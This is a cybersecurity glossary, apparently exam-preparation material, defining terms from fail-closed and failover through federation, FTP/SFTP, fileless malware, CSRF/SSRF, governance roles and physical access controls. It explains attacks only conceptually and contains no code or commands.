Fail-Closed - A security control configuration that blocks access to a resource in the event of failure. Fail-closed means that access is blocked or that the system enters the most secure state available, given whatever failure occurred. This mode prioritizes confidentiality and integrity over availability. The risk of a fail-closed control is system downtime.

For example, an inline security appliance that suffers power failure will fail-closed unless there is an alternative network path. Some devices designed to be installed inline have a backup cable path that will allow a fail-open operation.
Fail-Open - A security control configuration that ensures continued access to the resource in the event of failure. Fail-open means that network or host access is preserved, if possible. This mode prioritizes availability over confidentiality and integrity. The risk of a fail-open control is that a threat actor could engineer a failure state to defeat the control.

For example, an inline security appliance that suffers power failure will fail-closed unless there is an alternative network path. Some devices designed to be installed inline have a backup cable path that will allow a fail-open operation.
Failover - A technique that ensures a redundant component, device, or application can quickly and efficiently take over the functionality of an asset that has failed.
Failover Tests - Failover Tests involve intentionally causing the failure of a primary system or component to evaluate the automatic transfer of operations to a secondary, redundant system. These tests ensure backup systems can seamlessly take over during an actual incident, minimizing downtime and data loss. For example, a failover test could involve simulating the failure of a primary database server to verify that a standby server can successfully assume its role and maintain service continuity.
Failure to Enroll Rate (FER) - Incidents in which a template cannot be created and matched for a user during enrollment.
Fake Telemetry - Deception strategy that returns spoofed data in response to network probes.

Using port triggering or spoofing to return fake telemetry data when a host detects port scanning activity. This will result in multiple ports being falsely reported as open and slow down the scan. Telemetry can refer to any type of measurement or data returned by remote scanning. Similar fake telemetry could be used to report IP addresses as up when they are not, for instance.
False Acceptance Rate (FAR) - A biometric assessment metric that measures the number of unauthorized users who are mistakenly allowed access. It is where an interloper is accepted (Type II error or false match rate [FMR]). FAR is measured as a percentage.

False rejection causes inconvenience to users, but false acceptance can lead to security breaches, and so is usually considered the most important metric.
False Negative - In security scanning, a case that is not reported when it should be.

One should remain vigilant about the risk of false negatives, or potential vulnerabilities that go undetected in a scan. This risk can be counteracted by running repeat scans periodically and employing scanners from different vendors. Automated scan plug-ins rely on pre-compiled scripts and may not replicate a skilled and determined hacker's success, potentially leading to a false sense of security.
False Positive - In security scanning, a case that is reported when it should not be.

Active or intrusive scanning is generally more adept at detecting a wider array of vulnerabilities in host systems and can notably reduce false positives. A false positive refers to an instance where a scanner or another assessment tool incorrectly identifies a vulnerability.

For instance, a vulnerability scan might flag an open port on the firewall as a security risk based on its known use by a certain malware. However, if this port isn't open on the system, unnecessary time and effort is spent researching the issue. If a vulnerability scan throws excessive false positives, there's a risk of disregarding the scans altogether, which could potentially escalate into larger problems.
False Positives, False Negatives, and Log Review - After completing a vulnerability scan, the tool generates a summary report of all discoveries. The report color-codes vulnerabilities based on their criticality, with red typically denoting a weakness that requires immediate attention. Vulnerabilities can be reviewed by scope (most critical across all hosts) or by host. The reports typically include links to specific details about each vulnerability and how issues can be remediated.

Active or intrusive scanning is generally more adept at detecting a wider array of vulnerabilities in host systems and can notably reduce false positives. A false positive (In security scanning, a case that is reported when it should not be) refers to an instance where a scanner or another assessment tool incorrectly identifies a vulnerability.

For instance, a vulnerability scan might flag an open port on the firewall as a security risk based on its known use by a certain malware. However, if this port isn't open on the system, unnecessary time and effort is spent researching the issue. If a vulnerability scan throws excessive false positives, there's a risk of disregarding the scans altogether, which could potentially escalate into larger problems.

Moreover, one should remain vigilant about the risk of false negatives (In security scanning, a case that is not reported when it should be), or potential vulnerabilities that go undetected in a scan. This risk can be counteracted by running repeat scans periodically and employing scanners from different vendors. Automated scan plug-ins rely on pre-compiled scripts and may not replicate a skilled and determined hacker's success, potentially leading to a false sense of security.

Examining related system and network logs can validate vulnerability reports. Suppose a vulnerability scanner identifies a running process on a Windows machine, labels the application that creates this process unstable, and potentially causes the operating system to lock up and crash other processes and services. A review of the computer's event logs reveals several entries indicating the process has failed over the past few weeks. Additional entries show the subsequent failure of a few other related processes. In this case, a relevant data source has been utilized to confirm the validity of the vulnerability alert.
False Rejection Rate (FRR) - A biometric assessment metric that measures the number of valid subjects who are denied access. It is where a legitimate user is not recognized. This is also referred to as a Type I error or false non-match rate (FNMR). FRR is measured as a percentage.
Fast Identity Online (FIDO) Universal 2nd Factor (U2F) - Uses a public/private key pair to register each account, avoiding the need to communicate a shared secret, which is a weakness of HOTP and TOTP. The private key is locked to the U2F device and signs the token; the public key is registered with the authentication server and verifies the token.
Fault Tolerant - Protection against system failure by providing extra (redundant) capacity. Generally, fault tolerant systems identify and eliminate single points of failure.
Federation - A process that provides a shared login capability across multiple systems and enterprises. It essentially connects the identity management services of multiple systems.

Federation is the notion that a network needs to be accessible to more than just a well-defined group of employees. In business, a company might need to make parts of its network open to partners, suppliers, and customers. The company can manage its employee accounts easily enough. Managing accounts for each supplier or customer internally may be more difficult. Federation means that the company trusts accounts created and managed by a different network. As another example, in the consumer world, a user might want to use both Google Workspace and Twitter. If Google and Twitter establish a federated network for the purpose of authentication and authorization, then the user can log on to Twitter using their Google credentials or vice versa.

An on-premises network can use technologies such as LDAP and Kerberos, very often implemented as a Windows Active Directory network, because the administration of accounts and devices can be centralized. When implementing federation, authentication and authorization design comes with more constraints and additional requirements to ensure interoperability between different platforms. Web applications might not support Kerberos, while third-party networks might not support direct federation with Active Directory/LDAP. The design for these cloud networks likely requires the use of other standard protocols or frameworks for interoperability between web applications.

These interoperable federation protocols use claims-based identity. While the technical implementation and terminology is different, the overall model is similar to that of Kerberos SSO:

1. The principal attempts to access a service provider (SP). The service provider redirects the principal to an identity provider (IdP) to authenticate.

2. The principal authenticates with the identity provider and obtains a claim, in the form of some sort of token or document signed by the IdP.

3. The principal presents the claim to the service provider. The SP can validate that the IdP has signed the claim because of its trust relationship with the IdP.

4. The service provider can now connect the authenticated principal to its own accounts database to determine its permissions and other attributes. It may be able to query attributes of the user account profile held by the IdP, if the principal has authorized this type of access.
Fencing - A security barrier designed to prevent unauthorized access to a site perimeter. The exterior of a building may be protected by fencing. Security fencing needs to be transparent (so guards can see any attempt to penetrate it), robust (so that it is difficult to cut), and secure against climbing (which is generally achieved by making it tall and possibly by using razor wire). Fencing is generally effective, but the drawback is that it gives a building an intimidating appearance. Buildings that are used by companies to welcome customers or the public may use more discreet security methods.
File Integrity Monitoring (FIM) - A type of software that reviews system files to ensure that they have not been tampered with.
File Transfer Protocol (FTP) - Application protocol used to transfer files between network hosts. Variants include S(ecure)FTP, FTP with SSL (FTPS and FTPES), and T(rivial)FTP. FTP utilizes ports 20 and 21.

A File Transfer Protocol (FTP) server is typically configured with several public directories, hosting files, and user accounts. Most HTTP servers also function as FTP servers, and FTP services, accounts, and directories may be installed and enabled by default when you install a web server. FTP is more efficient than file attachments or HTTP file transfer but has no security mechanisms. All authentication and data transfer are communicated as plaintext, meaning that credentials are easily picked out of intercepted FTP traffic.

You should check that users do not install unauthorized servers on their PCs (a rogue server). For example, a version of IIS that includes HTTP, FTP, and SMTP servers is shipped with client versions of Windows, though it is not installed by default.
File Transfer Services - There are many ways of transferring files across networks. A network operating system can host shared folders and files, enabling them to be copied or accessed over the local network or via remote access (over a VPN, for instance). Email and messaging apps can send files as attachments. HTTP supports file download (and uploads via various scripting mechanisms). There are also peer-to-peer file sharing services.

Despite the availability of these newer protocols and services, the File Transfer Protocol (FTP) remains very popular because it is efficient and has wide cross-platform support.

File Transfer Protocol
A File Transfer Protocol (FTP - Application protocol used to transfer files between network hosts. Variants include S(ecure)FTP, FTP with SSL (FTPS and FTPES), and T(rivial)FTP. FTP utilizes ports 20 and 21) server is typically configured with several public directories, hosting files, and user accounts. Most HTTP servers also function as FTP servers, and FTP services, accounts, and directories may be installed and enabled by default when you install a web server. FTP is more efficient than file attachments or HTTP file transfer but has no security mechanisms. All authentication and data transfer are communicated as plaintext, meaning that credentials are easily picked out of intercepted FTP traffic.

You should check that users do not install unauthorized servers on their PCs (a rogue server). For example, a version of IIS that includes HTTP, FTP, and SMTP servers is shipped with client versions of Windows, though it is not installed by default.

SSH FTP (SFTP) and FTP Over SSL (FTPS)
Secure File Transfer Protocol (SFTP - A secure version of the File Transfer Protocol that uses a Secure Shell (SSH) tunnel as an encryption method to transfer, access, and manage files) addresses privacy and integrity issues of FTP by encrypting the authentication and data transfer between client and server. In SFTP, a secure link is created between the client and server using Secure Shell (SSH) over TCP port 22. Ordinary FTP commands and data transfer can then be sent over the secure link without the risk of eavesdropping or on-path attacks. This solution requires an SSH server that supports SFTP and SFTP client software.

Another means of securing FTP is to use the connection security protocol SSL/TLS. There are two means of doing this:

1. Explicit TLS (FTPES) - Uses the AUTH TLS command to upgrade an unsecure connection established over port 21 to a secure one. This protects authentication credentials. The data connection for the file transfers can also be encrypted (using the PROT command).

2. Implicit TLS (FTPS - A type of FTP using TLS for confidentiality) - Negotiates an SSL/TLS tunnel before the exchange of any FTP commands. This mode uses the secure port 990 for the control connection.

FTPS is tricky to configure when there are firewalls between the client and server. Consequently, FTPES is usually the preferred method.
Fileless Malware - The term "fileless" has gained prominence to refer to these modern types of malware. Fileless is not a definitive classification, but it describes a collection of common behaviors and techniques:

1. Fileless malware does not write its code to disk. The malware uses memory-resident techniques to run in its own process, within a host process or dynamic link library (DLL), or within a scripting host. This does not mean that there is no disk activity at all, however. The malware may change registry values to achieve persistence (executing if the host computer is restarted). The initial execution of the malware may also depend on the user running a downloaded script, file attachment, or Trojan software package.

2. Fileless malware uses lightweight shellcode (A lightweight block of malicious code that exploits a software vulnerability to gain initial access to a victim system) to achieve a backdoor mechanism on the host. The shellcode is easy to recompile in an obfuscated form to evade detection by scanners. It is then able to download additional packages or payloads to achieve the threat actor's objectives. These packages can also be obfuscated, streamed, and compiled on the fly to evade automated detection.

3. Fileless malware may use "live off the land" techniques rather than compiled executables to evade detection. This means that the malware code uses legitimate system scripting tools, notably PowerShell and Windows Management Instrumentation (WMI), to execute payload actions. If they can be executed with sufficient permissions, these environments provide all the tools the attacker needs to perform scanning, reconfigure settings, and exfiltrate data.

The terms "Advanced Persistent Threat (APT - An attacker's ability to obtain, maintain, and diversify access to network systems using exploits and malware) " and "Advanced Volatile Threat (AVT)" can be used to describe this general class of modern fileless/live off the land malware. Another useful classification is low-observable characteristics (LOC) attack. The exact classification is less important than the realization that adversaries can use any variety of coding tricks to effect intrusions and that their tactics, techniques, and procedures to evade detection are continually evolving.
Financial Data - Data held about bank and investment accounts, plus information such as payroll and tax returns.

Financial data pertains to information concerning an organization's financial activities, performance, and transactions, including financial statements, balance sheets, income statements, cash flow statements, audit reports, tax records, financial projections, budgets, and other financial reports. Financial data also encompasses details of financial transactions, such as accounts payable, accounts receivable, general ledger entries, and transactional records. Legal and financial data are highly sensitive and confidential due to their nature and the potential impact they can have on an organization's reputation, legal standing, and financial stability.
Financial Motivation - Threat actor motivations driven by monetary gain, including blackmail (demanding payment to prevent release of information), extortion (demanding payment to prevent or halt attacks), and fraud (falsifying records for financial benefit). Financial motivations are among the most common drivers for cybercrime, particularly among organized crime groups.
Firewall Logs - Any firewall rule can be configured to generate an event whenever it is triggered. As with most types of security data, this can quickly generate an overwhelming number of events. It is also possible to configure log-only rules. Typically, firewall logging (A target for event data related to access rules that have been configured for logging) will be used when testing a new rule or only enabled for high-impact rules.

A firewall audit event will record a date/timestamp, the interface on which the rule was triggered, whether the rule matched incoming/ingress or outgoing/egress traffic, and whether the packet was accepted or dropped. The event data will also record packet information, such as source and destination address and port numbers. This information can support investigation of host compromise. For example, say that a host-based IDS reports that a malicious process on a local server is attempting to connect to a particular port on an Internet host. The firewall log could confirm whether the connection was allowed or denied and identify which rule potentially needs adjusting.
Firmware Vulnerabilities - Firmware is the foundational software that controls hardware and can contain significant vulnerabilities. For instance, the Meltdown and Spectre vulnerabilities identified in 2018 impacted almost all computers and mobile devices. The vulnerability was associated with the processors used inside the computer and allowed malicious programs to steal data as it was being processed. Another vulnerability, "LoJax," discovered in the Unified Extensible Firmware Interface (UEFI) firmware in 2018, enabled an attacker to persist on a system even after a complete hard drive replacement or OS reinstallation. End-of-life (EOL) hardware vulnerabilities arise when manufacturers cease providing product updates, parts, or patches to the firmware.
First Responder - The first experienced person or team to arrive at the scene of an incident.
Forgery Attacks - An attack that exploits weak authentication to perform a request via a hijacked session.

In contrast with replay attacks, a forgery attack hijacks an authenticated session to perform some action without the user's consent.

Cross-Site Request Forgery
A malicious script hosted on the attacker's site that can exploit a session started on another site in the same browser.

A cross-site request forgery (CSRF) can exploit applications that use cookies to authenticate users and track sessions. To work, the threat actor must convince the victim to start a session with the target site. The attacker must then pass an HTTP request to the victim's browser that spoofs an action on the target site, such as changing a password or an email address. This request could be disguised in ways that accomplish the attack without the victim necessarily having to click a link. If the target site assumes that the browser is authenticated because there is a valid session cookie, and doesn't complete any additional authorization process on the attacker's input, it will accept the request as genuine. This is also referred to as a confused deputy attack.

Server-Side Request Forgery
An attack where an attacker takes advantage of the trust established between the server and the resources it can access, including itself.

A server-side request forgery (SSRF) causes a server application to process an arbitrary request that targets another service. The target service could be another application running on the same host or a service running on a remote host. SSRF exploits both the lack of authentication between the internal servers and services. It also relies on weak input validation, which allows the attacker to submit arbitrary requests.

SSRF attacks are often targeted against cloud infrastructure where the web server is only the public-facing component of a deeper processing chain. A typical web application comprises multiple layers of servers, with a client interface, middleware logic layers, and a database layer. Requests initiated from the client interface (a web form) are likely to require multiple requests and responses between the middleware and back-end servers. These will be implemented as HTTP header requests and responses between each server. SSRF is a means of accessing these internal servers by causing the public server to execute requests on them. While with CSRF an exploit only has the privileges of the client, with SSRF the manipulated request is made with the server's privilege level.
Forward Proxy Server - A forward proxy provides for protocol-specific outbound traffic. For example, a web proxy enables client computers on the local network to connect to websites and secure websites on the Internet. This is a forward proxy that services TCP ports 80 and 443 for outbound traffic.
Fraud - Falsifying records, such as an internal fraud that involves tampering with accounts. Fraud is falsifying records. Internal fraud might involve tampering with accounts to embezzle funds or inventing customer details to launder money. Criminals might use disinformation to commit fraud, such as posting fake news to affect the share price of a company, promote pyramid schemes, or to create fake companies.
Function as a Service (FaaS) - Function as a Service (FaaS) is associated with serverless computing. It allows developers to execute individual pieces of code (or functions) in response to various triggers, such as HTTP requests, database changes, or scheduled tasks. The function can be scaled dynamically to handle changes in load, similarly to other cloud-based services.
Gap analysis - An analysis that measures the difference between the current and desired states in order to help assess the scope of work included in a project. Gap analysis is a process that identifies how an organization's security systems deviate from those required or recommended by a framework. This will be performed when first adopting a framework or when meeting a new industry or legal compliance requirement. The analysis might be repeated every few years to meet compliance requirements or to validate any changes that have been made to the framework. For each section of the framework, a gap analysis report will provide an overall score, a detailed list of missing or poorly configured controls associated with that section, and recommendations for remediation. While some or all work involved in gap analysis could be performed by the internal security team, a gap analysis is likely to involve third-party consultants. Frameworks and compliance requirements from regulations and legislation can be complex enough to require a specialist. Advice and feedback from an external party can alert the internal security team to oversights and to new trends and changes in best practice.
Gateways and Locks - To secure a gateway it must be fitted with a lock. A secure gateway will normally be self-closing and self-locking rather than dependent on the user to close and lock it. Lock types can be categorized as follows:

1. Physical - Are conventional locks that prevent the door handle from being operated without using a key. More expensive types offer greater resistance against lock picking.

2. Electronic - Are locks, rather than a key, that operate by entering a PIN on an electronic keypad. This type of lock is also referred to as cipher, combination, or keyless. A smart lock may be opened using a magnetic swipe card or feature a proximity reader (A scanner that reads data from an RFID or NFC tag when in range) to detect the presence of a physical token, such as a wireless key fob or smart-card.


3. Biometric - Is a lock integrated with a biometric scanner.

Access Control Vestibule (Mantrap)
An access control vestibule (A secure entry system with two gateways, only one of which is open at any one time), also known as a mantrap, is a security measure that regulates entry to a secure area. It involves two doors or gates that interlock and permit only one individual to pass through at a time. The first door opens after the person is granted access via an access control system, such as a card reader or biometric scanner. Once the person enters the vestibule, the first door shuts. The second door opens only when the first door is firmly shut. This guarantees only one person can enter or exit at a time, preventing unauthorized access or tailgating. Access control vestibules are frequently used in high-security settings like datacenters, government buildings, and financial institutions to offer an additional layer of physical security control. They effectively deter unauthorized access to secure areas and safeguard sensitive assets against potential physical attacks.

Cable Locks
Cable locks (Devices can be physically secured against theft using cable ties and padlocks. Some systems also feature lockable faceplates, preventing access to the power switch and removable drives) attach to a secure point on the device chassis. A server chassis might come with both a metal loop and a Kensington security slot. As well as securing the chassis to a rack or desk, the position of the secure point prevents the chassis from being opened without removing the cable first.

Access Badges
Access badges (An authentication mechanism that allows a user to present a smart card to operate an entry system) are a fundamental component of physical security in larger organizations where control over access to various locations is critical. Plastic cards embedded with magnetic strips, radio frequency identification (RFID) chips, or near-field communication (NFC) technology are issued to authorized individuals, such as employees, contractors, or visitors instead of physical keys. Access badges replace physical keys but provide access similarly. This is achieved by requiring the badge to be swiped, tapped, or brought into proximity with a reader at the access point, like a door or turnstile. The reader communicates with a control system to verify the badge's authenticity and the level of access granted to the badge holder. If the system recognizes the badge as valid and authorized for that area, the door unlocks, granting access.

It is important to note that implementing this type of access control system requires magnetic door-locking mechanisms and access card readers, which depend upon electrical power and network communications at each access point (such as a doorway.)

A physical access control system (PACS) is a critical component in managing and maintaining security within a facility. It is a system designed to control who can access specific locations within a building or site. The PACS operates through a combination of hardware and software, including access cards or badges, card readers, access control panels, and a centralized control network. The PACS system provides valuable badge access activity logging capabilities.

In addition to controlling access, access badges also serve as a form of identification, displaying pertinent information about the badge holder, such as their name, title, and photograph. This aids in quickly identifying individuals within a facility and verifying that they are in an area appropriate for their role or purpose. Moreover, access badges can provide valuable data for security audits and investigations. Each time a badge is used, a PACS system can log the time, location, and identity associated with the access event. This can be crucial in investigating security breaches, understanding movement patterns, and even planning emergency evacuation strategies.
General Data Protection Regulation (GDPR) - Provisions and requirements protecting the personal data of European Union (EU) citizens. Transfers of personal data outside the EU Single Market are restricted unless protected by like-for-like regulations, such as the US's Privacy Shield requirements.
Geofencing - Security control that can enforce a virtual boundary based on real-world geography.
Geographic Dispersion - A resiliency mechanism where processing and data storage resources are replicated between physically distant sites. Geographic dispersion refers to the distribution of recovery sites across different geographic locations for disaster recovery (DR) purposes. The concept aims to ensure that recovery sites are located far enough apart to minimize the impact of regional disasters, such as natural calamities or localized incidents. By strategically dispersing recovery sites, organizations can ensure the resilience of their recovery strategies and reduce the risk of a single catastrophic event affecting all business operations.
Geolocation - The identification or estimation of the physical location of an object, such as a radar source, mobile phone, or Internet-connected computing device. IP address can be associated with a map location to varying degrees of accuracy based on information published by the registrant, including name, country, region, and city.
Global Positioning System (GPS) - A means of determining a receiver's position on Earth based on information received from orbital satellites.
Governance - Creating and monitoring effective policies and procedures to manage assets, such as data, and ensure compliance with industry regulations and local, national, and global legislation.
Governance and Accountability - Creating and monitoring effective policies and procedures to manage assets, such as data, and ensure compliance with industry regulations and local, national, and global legislation.

Governance practices ensure organizations abide by all applicable cybersecurity laws and regulations to protect them from legal liability. Governance and organizational-level oversight must manage many legal risks, such as regulatory compliance requirements, contractual obligations, public disclosure laws, breach liability, privacy laws, intellectual property protection, and licensing agreements, and interpret and translate these legal requirements into operational controls to avoid legal trouble, act ethically, and protect the organization.

Monitoring and Revision
The cybersecurity landscape is continually evolving. Consequently, organizations must ensure that their cybersecurity policies, procedures, standards, and legal compliance practices associated with legal and regulatory compliance are regularly monitored, evaluated, and updated. These responsibilities are generally managed via collaboration among diverse groups to review existing policies, procedures, and standards and ensure their effectiveness against current requirements. Routine audits, inspections, and assessments are commonly used to measure compliance levels and identify new risks. The results of compliance reports, technological changes, business processes, laws, or newly identified risks drive policy, procedure, and standards revisions. Regular training sessions help to inform employees of policy changes and ensure continued compliance.

Additionally, organizations must maintain awareness of any changes in cybersecurity legislation in their jurisdictions, including international, national, regional, or industry-specific laws. Effective monitoring and revision of cybersecurity policies, procedures, standards, and legal compliance practices is a dynamic, cyclical process requiring diligence, foresight, and proactive strategies.

Governance Boards
Governance boards (Senior executives and external stakeholders with responsibility for setting strategy and ensuring compliance) are crucial in ensuring an organization's effective security governance and oversight because they are responsible for setting strategic objectives, policies, and guidelines for security practices and risk management. Governance boards oversee the implementation of security controls, work closely with risk management teams to ensure compliance with relevant laws and regulations, and evaluate the security program's overall effectiveness. Governance boards drive organization-wide security practices through leadership, guidance, and accountability and ensure that security risks are effectively identified and mitigated. Governance boards unite executive management, security professionals, and stakeholders to ensure security is a top strategic priority aligned with the organization's objectives and values.

Centralized versus Decentralized
Centralized and decentralized security governance models aim to achieve the organization's security goals, protect assets, mitigate risks, and ensure regulatory compliance. Additionally, they recognize the importance of security and the need for collaboration between stakeholders and departments. However, there are notable differences between the two approaches. In centralized security governance, decision-making authority primarily rests with a single core group or department that establishes policies, procedures, and guidelines and makes important security-focused decisions. Resource allocation, including budget and personnel, is controlled by this group to promote consistency and standardization across the entire organization.

In contrast, decentralized security governance distributes decision-making authority to different groups or departments to facilitate security-focused decisions based on localized needs and priorities. Each unit has greater control over the allocation of security resources to allow greater adaptability and tailoring of security capabilities.

The choice between centralized and decentralized security governance depends on the organization's size, structure, culture, and risk appetite. Ultimately, the goal is to create a security governance model that effectively supports the organization's needs while balancing security risks.

Hybrid governance structures combine elements of both centralized and decentralized approaches. It aims to balance the advantages of centralized oversight and decentralized implementation. Under a hybrid system, specific security processes and decisions are centralized, while others are delegated to business units or departments to facilitate the development of standardized policies at the enterprise level while providing flexibility and local control as warranted.

Committees and Boards
Governance boards depend upon governance committees (Leaders and subject matter experts with responsibility for defining policies, procedures, and standards within a particular domain or scope) to assist in complex decision-making situations. The governance board is typically composed of executives with the ultimate decision-making authority and is responsible for setting the strategic direction and policies of the organization. This responsibility often requires executives to make critical decisions regarding subjects outside their scope of expertise.

Committees are specialized groups comprised of subject matter experts, stakeholders, and representatives from relevant departments that focus on specific issues, such as security, risk management, audit, or compliance. They provide in-depth analysis, recommendations, and operational support to the governance board to provide them with the critical information needed to make effective decisions.

Governance boards and governance committees serve distinct roles within an organization's governance structure. Governance boards are typically composed of high-level executives and external stakeholders, whereas, governance committees are typically comprised of subject matter experts and operational leaders.

Government Entities and Groups
At the government level, governance committees are often represented by specialized agencies. Several government agencies are associated with security governance and differ between countries and jurisdictions. A few examples of government agencies with security governance responsibilities include the following:

1. Regulatory Agencies - Regulatory agencies establish and enforce security standards, regulations, and guidelines. They oversee compliance with laws related to specific sectors such as finance, healthcare, telecommunications, and energy.

2. Intelligence Agencies - Intelligence agencies gather and analyze information to identify and counteract potential security threats and provide this information to national-level government groups to steer national policy and military strategy.

3. Law Enforcement Agencies - Law enforcement agencies enforce laws and regulations related to public safety and security. They investigate and prosecute criminal activities, including cybercrimes and terrorist activities.

4. Defense and Military Organizations - Defense and military organizations are responsible for safeguarding national security and protecting the country from external threats. They develop strategies, policies, and capabilities to address physical security, border control, and defense-related cybersecurity.

5. Data Protection Authorities - Data protection authorities focus on protecting personal data and privacy rights. They enforce data protection regulations and provide guidance on the best practices for securing personal information.

6. National Cybersecurity Agencies - National cybersecurity agencies focus on protecting critical infrastructure, government networks, and national cybersecurity interests. They develop cybersecurity strategies, coordinate incident response, and provide guidance on cybersecurity practices for government entities and private organizations.

Data Governance Roles
Security governance relies heavily on specially designed and interdependent roles called owner, controller, processor, and custodian. Each role carries unique responsibilities that contribute to maintaining effective security oversight and control.

Owner - A senior (executive) role with ultimate responsibility for maintaining the confidentiality, integrity, and availability of an information asset. A high-ranking employee, like a director or a vice president, typically holds the owner role and is ultimately responsible for ensuring data is appropriately protected. The owner identifies what level of classification and sensitivity the data has, decides who should have access to it, and what level of security should be applied. In relation to governance, the owner provides strategic guidance to ensure that security policies align with business objectives.

Controller - In privacy regulations, the entity that determines why and how personal data is collected, stored, and used. The controller role closely relates to GDPR and identifies the purposes, conditions, and means of processing personal data. An individual, public authority, agency, or other body can fill the controller role. The controller ensures that data processing activities adhere to all legal requirements. In relation to governance, the controller helps maintain legal and regulatory compliance.

Processor - In privacy regulations, an entity trusted with a copy of personal data to perform storage and/or analysis on behalf of the data collector. The processor is responsible for processing personal data on behalf of the controller and often represents cloud service providers (CSP) but could also be represented by vendors and business partners. Processors must maintain records of their processing activities, cooperate with supervisory authorities, and implement appropriate security measures to protect the data they handle. In relation to governance, the processor role ensures that data is handled securely and in accordance with the rules established by the owner and controller roles.

Custodian - An individual who is responsible for managing the system on which data assets are stored, including being responsible for enforcing access control, encryption, and backup/recovery measures. The custodian, also known as the data steward, is responsible for the safe custody, transport, storage of the data, and implementation of business rules. The IT department typically represents the custodian role, and in relation to governance, the custodian role implements and enforces the security controls established by the data owner and controller and reports any issues indicative of a security incident.

Coordination among data owner, controller, processor, and custodian in managing and protecting data is crucial to ensure compliance with data protection regulations, establish clear responsibilities, and maintain data integrity and security.
Governance Boards - Senior executives and external stakeholders with responsibility for setting strategy and ensuring compliance.

Governance boards are crucial in ensuring an organization's effective security governance and oversight because they are responsible for setting strategic objectives, policies, and guidelines for security practices and risk management. Governance boards oversee the implementation of security controls, work closely with risk management teams to ensure compliance with relevant laws and regulations, and evaluate the security program's overall effectiveness. Governance boards drive organization-wide security practices through leadership, guidance, and accountability and ensure that security risks are effectively identified and mitigated. Governance boards unite executive management, security professionals, and stakeholders to ensure security is a top strategic priority aligned with the organization's objectives and values.
Governance Committees - Leaders and subject matter experts with responsibility for defining policies, procedures, and standards within a particular domain or scope.

Governance boards depend upon governance committees to assist in complex decision-making situations. The governance board is typically composed of executives with the ultimate decision-making authority and is responsible for setting the strategic direction and policies of the organization. This responsibility often requires executives to make critical decisions regarding subjects outside their scope of expertise.

Committees are specialized groups comprised of subject matter experts, stakeholders, and representatives from relevant departments that focus on specific issues, such as security, risk management, audit, or compliance. They provide in-depth analysis, recommendations, and operational support to the governance board to provide them with the critical information needed to make effective decisions.

Governance boards and governance committees serve distinct roles within an organization's governance structure. Governance boards are typically composed of high-level executives and external stakeholders, whereas, governance committees are typically comprised of subject matter experts and operational leaders.
Government Entities and Groups - At the government level, governance committees are often represented by specialized agencies. Several government agencies are associated with security governance and differ between countries and jurisdictions. A few examples of government agencies with security governance responsibilities include the following:

1. Regulatory Agencies - Regulatory agencies establish and enforce security standards, regulations, and guidelines. They oversee compliance with laws related to specific sectors such as finance, healthcare, telecommunications, and energy.

2. Intelligence Agencies - Intelligence agencies gather and analyze information to identify and counteract potential security threats and provide this information to national-level government groups to steer national policy and military strategy.

3. Law Enforcement Agencies - Law enforcement agencies enforce laws and regulations related to public safety and security. They investigate and prosecute criminal activities, including cybercrimes and terrorist activities.

4. Defense and Military Organizations - Defense and military organizations are responsible for safeguarding national security and protecting the country from external threats. They develop strategies, policies, and capabilities to address physical security, border control, and defense-related cybersecurity.

5. Data Protection Authorities - Data protection authorities focus on protecting personal data and privacy rights. They enforce data protection regulations and provide guidance on the best practices for securing personal information.

6. National Cybersecurity Agencies - National cybersecurity agencies focus on protecting critical infrastructure, government networks, and national cybersecurity interests. They develop cybersecurity strategies, coordinate incident response, and provide guidance on cybersecurity practices for government entities and private organizations.
GPS Tagging - GPS tagging is the process of adding geographical identification metadata, such as the latitude and longitude where the device was located at the time, to media such as photographs, SMS messages, video, and so on. It allows the app to place the media at specific latitude and longitude coordinates. GPS tagging is highly sensitive personal information and potentially confidential organizational data. GPS tagged pictures uploaded to social media could be used to track a person's movements and location. For example, a Russian soldier revealed troop positions by uploading GPS tagged selfies to Instagram.
Group Account - A group account is a collection of user accounts that is useful when establishing file permissions and user rights because when many individuals need the same level of access, a group could be established containing all the relevant users.
Group Policy Objects (GPOs) - On a Windows domain, a way to deploy per-user and per-computer settings such as password policy, account restrictions, firewall status, and so on.

On a Windows Active Directory network access policies can be configured via group policy objects (GPOs). GPOs can be used to configure access rights for user/group/role accounts. GPOs can be linked to network administrative boundaries in Active Directory, such as sites, domains, and organizational units (OU).
Guidelines - Best practice recommendations and advice for configuration items where detailed, strictly enforceable policies and standards are impractical.

Guidelines describe recommendations that steer actions in a particular job role or department. They are more flexible than policies and allow greater discretion for the individuals implementing them. Guidelines provide best practices and suggestions on achieving goals and completing tasks effectively and help individuals understand the required steps to comply with a policy or improve effectiveness.

An example of a guideline might be related to help desk support practices related to using email in response to employee support requests. The guideline may recommend specific language, tone, or response times but would allow for flexibility depending on the request's circumstances. While both policies and guidelines work to steer the actions and behaviors of employees, policies are mandatory and define strict rules, whereas guidelines provide recommendations and allow for more individual judgment and discretion. Regular review of guidelines is important to ensure they remain practical and relevant. Periodic assessments and updates to guidelines allow organizations to adapt them to changing technologies, business operations, emerging threats, and evolving industry standards.
Hacker - Often used to refer to someone who breaks into computer systems or spreads viruses, ethical hackers prefer to think of themselves as experts on and explorers of computer security systems. Hacker describes an individual who has the skills to gain access to computer systems through unauthorized or unapproved means. Originally, hacker was a neutral term for a user who excelled at computer programming and computer system administration. Hacking into a system was a sign of technical skill and creativity that gradually became associated with illegal or malicious system intrusions. The terms unauthorized (previously known as black hat) and authorized (previously known as white hat) are used to distinguish these motivations. An authorized hacker always seeks authorization to perform penetration testing of private and proprietary systems.
Hacktivist - A threat actor that is motivated by a social issue or political cause. The historical image of a hacker is that of a loner, acting as an individual with few resources or funding. While the "lone hacker" remains a threat that must be accounted for, threat actors are now likely to work as part of a team or group. The collaborative team effort means that these threat actors are able to develop sophisticated tools and novel strategies. A hacktivist group uses cyber weapons to promote a political agenda. Hacktivists might attempt to use data exfiltration to obtain and release confidential information to the public domain, perform service disruption attacks, or deface websites to spread disinformation. Political, media, and financial groups and companies are most at risk of becoming a target for hacktivists, but environmental and animal advocacy groups may target companies in a wide range of industries.
Hard Authentication Token - Authentication token generated by a cryptoprocessor on a dedicated hardware device. As the token is never transmitted directly, this implements an ownership factor within a multifactor authentication scheme.

A hard authentication token is generated within a secure cryptoprocessor. The authentication design means that there is no transmission of the token itself. Several device-based authenticators can be used to implement hard tokens:

1. Smart cards - A security device similar to a credit card that can store authentication information, such as a user's private key, on an embedded cryptoprocessor. Implement certificate-based authentication. The smart card stores the user's digital certificate, the private key associated with the certificate, and a personal identification number (PIN) used to activate the card. The card must be presented to a reader. There are physical contact and contactless near-field communication (NFC) card types.

